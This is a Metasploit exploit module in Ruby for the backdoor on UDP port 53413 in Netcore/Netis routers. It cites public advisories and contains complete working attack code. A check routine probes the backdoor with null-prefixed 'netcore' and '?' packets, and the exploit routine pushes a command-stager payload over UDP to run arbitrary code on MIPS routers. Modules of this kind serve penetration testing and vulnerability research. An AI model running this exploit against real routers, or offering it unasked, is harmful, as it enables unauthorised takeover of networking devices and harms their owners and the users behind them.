##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Udp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Netcore Router Udp 53413 Backdoor',
      'Description'     => %q{
        Routers manufactured by Netcore, a popular brand for networking
        equipment in China, have a wide-open backdoor that can be fairly
        easily exploited by attackers. These products are also sold under
        the Netis brand name outside of China. This backdoor allows
        cybercriminals to easily run arbitrary code on these routers,
        rendering it vulnerable as a security device.
      },
      'Author'          => [ 'Nixawk' ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          [ 'URL', 'https://www.seebug.org/vuldb/ssvid-90227' ],
          [ 'URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/netis-routers-leave-wide-open-backdoor/' ]
        ],
      'Privileged'      => true,
      'Targets'         =>
        [
          ['MIPS Little Endian',
           {
             'Platform' => 'linux',
             'Arch'     => ARCH_MIPSLE
           }
          ],
          ['MIPS Big Endian',
           {
             'Platform' => 'linux',
             'Arch'     => ARCH_MIPSBE
           }
          ]
        ],
      'DefaultTarget'   => 0,
      'DisclosureDate'  => 'Aug 25 2014'))

    register_options(
      [
        OptInt.new('TIMEOUT', [true, 'The socket response timeout in milliseconds', 1000]),
        Opt::RPORT(53413)
      ], self.class)
  end

  def timeout
    (datastore['TIMEOUT'] || 1000) / 1000.0
  end

  def send_command(data)
    payload = "\x00" * 8
    payload << data
    udp_sock.put(payload)
  end

  def execute_command(cmd, _opts)
    send_command(cmd)
  end

  def vuln_version?
    connect_udp
    resp = []
    ['netcore', '?'].each do |command|
      send_command(command)
      resp << udp_sock.get(timeout)
    end
    disconnect_udp
    resp_str = resp.join(',')
    resp.length >= 1 && resp_str.include?("\x00\x00\x00\x05")
  end

  def check
    if vuln_version?
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    unless vuln_version?
      print_status('Target is not vulnerable.')
      return
    end

    print_status('Exploiting...')
    connect_udp
    execute_cmdstager(:flavor => :echo, :linemax => 200)
    disconnect_udp
  end
end
